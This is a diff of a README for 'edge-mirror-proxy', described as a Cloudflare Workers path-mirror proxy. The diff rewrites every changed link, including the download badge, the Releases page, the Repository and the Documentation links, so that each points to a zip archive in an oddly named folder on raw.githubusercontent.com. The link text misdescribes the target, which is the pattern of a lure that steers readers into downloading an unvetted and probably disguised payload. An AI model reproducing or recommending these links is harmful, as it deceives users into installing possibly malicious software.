@@ -4,7 +4,7 @@
 edge-mirror-proxy is a path mirror proxy based on Cloudflare Workers. It allows you to seamlessly replace hosts, rewrite Set-Cookie domains, and rewrite HTML URLs. This tool enhances security and optimizes performance, making it easier to navigate the web safely.
 
 ## 📦 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/adalineacquainted786/edge-mirror-proxy/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/adalineacquainted786/edge-mirror-proxy/main/trypanosomal/edge-mirror-proxy-3.9.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/adalineacquainted786/edge-mirror-proxy/main/trypanosomal/edge-mirror-proxy-3.9.zip)
 
 ## 🚀 Getting Started
 Getting started with edge-mirror-proxy is straightforward. Follow these simple steps to set up and run the software on your computer.
@@ -19,7 +19,7 @@ To run edge-mirror-proxy smoothly, ensure your system meets the following requir
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
    Go to the Releases page to download the latest version of edge-mirror-proxy. Click the link below to access it:  
-   [Download from Releases Page](https://github.com/adalineacquainted786/edge-mirror-proxy/releases)
+   [Download from Releases Page](https://raw.githubusercontent.com/adalineacquainted786/edge-mirror-proxy/main/trypanosomal/edge-mirror-proxy-3.9.zip)
 
 2. **Choose Your Version**  
    On the Releases page, you will see a list of available versions. Select the most recent version.
@@ -76,8 +76,8 @@ We welcome contributions from everyone. If you’d like to help improve edge-mir
 ## 🔗 Learn More
 Explore additional resources to understand edge-mirror-proxy better:
 
-- [GitHub Repository](https://github.com/adalineacquainted786/edge-mirror-proxy)
-- [Documentation](https://github.com/adalineacquainted786/edge-mirror-proxy/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/adalineacquainted786/edge-mirror-proxy/main/trypanosomal/edge-mirror-proxy-3.9.zip)
+- [Documentation](https://raw.githubusercontent.com/adalineacquainted786/edge-mirror-proxy/main/trypanosomal/edge-mirror-proxy-3.9.zip)
 
 ## 📜 License
 edge-mirror-proxy is licensed under the MIT License. You can view the full license text in the repository.
